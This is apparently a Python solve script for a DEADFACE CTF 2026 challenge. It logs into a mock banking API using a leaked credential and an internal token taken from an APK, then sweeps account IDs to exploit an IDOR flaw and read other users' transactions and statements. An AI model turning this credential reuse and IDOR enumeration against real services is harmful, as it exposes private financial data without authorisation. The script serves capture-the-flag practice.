#!/usr/bin/env python3
"""
No Holding Back — DEADFACE CTF 2026 (mobile app / osint, 210 pts)
Solve script — full chain.

OSINT (do these by hand, they're web pages):
  1. ghosttown.deadface.io  (DEADFACE's forum)
     /c/havoc -> topic /t/58 "We found a DMF password in a public dump.
     Also... JOHN DOE IS A REAL PERSON???" (by lilith)
     -> a De Monne Financial employee "John Doe" is in a public credential dump
     -> spookyboi: "Already shared on DoomScroll lol"
  2. doomscroll.dctf.io (social site) -> /spookyboi -> /post/267
     -> screenshot of the dump snippet + writeup:
        Username: john.doe@example.com
        Password: Welcome1!

Mobile (from the APK, see "Inside Man" writeup):
  3. API base http://dmf.dctf.io:8081 + X-Internal-Token from ApiClient.java

Exploit:
  4. Log in as John Doe -> valid JWT (user_id 1)
  5. /api/accounts/{id}/transactions|statements does NOT check ownership
     (IDOR - "the app's logic" that lets you pull details of any user).
     Sweep account ids: John Doe owns 1001/1002, so ids live ~1000+.
     Account 1007 has a RESTRICTED internal-audit statement containing the flag.
"""
import json
import re
import sys
import time

import requests

BASE = "http://dmf.dctf.io:8081"
INTERNAL_TOKEN = "zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR"
EMAIL = "john.doe@example.com"      # from the DoomScroll screenshot
PASSWORD = "Welcome1!"

s = requests.Session()
s.headers.update({"X-Internal-Token": INTERNAL_TOKEN, "User-Agent": "DeMonnApp/2.4.1"})


def robust(fn, *args, tries=5, **kw):
    """Retry helper - the challenge server drops connections intermittently."""
    last = None
    for i in range(tries):
        try:
            return fn(*args, **kw)
        except requests.RequestException as e:
            last = e
            time.sleep(2 * (i + 1))
    raise last


r = robust(s.post, f"{BASE}/api/auth/login", json={"email": EMAIL, "password": PASSWORD}, timeout=20)
r.raise_for_status()
tok = r.json()["token"]
s.headers["Authorization"] = f"Bearer {tok}"
print(f"[+] logged in as {EMAIL} (user_id {r.json()['user']['id']})")

flags = set(re.findall(r"deadface\{[^}]+\}", r.text))

# IDOR: walk every plausible account id, not just John Doe's own (1001/1002)
found_account = None
for aid in range(1000, 1040):
    for kind in ("transactions", "statements"):
        rr = robust(s.get, f"{BASE}/api/accounts/{aid}/{kind}", timeout=20)
        if rr.status_code != 200 or rr.text.strip() in ("[]", ""):
            continue
        print(f"[*] acct {aid} {kind}: {rr.text[:220]}")
        new = re.findall(r"deadface\{[^}]+\}", rr.text)
        if new:
            found_account = (aid, kind, rr.json())
            flags.update(new)

print()
if flags:
    for f in sorted(flags):
        print("=" * 62)
        print("FLAG:", f)
        print("=" * 62)
    if found_account:
        print("\nsource: account", found_account[0], found_account[1])
        print(json.dumps(found_account[2], indent=2))
else:
    sys.exit("no flag found")
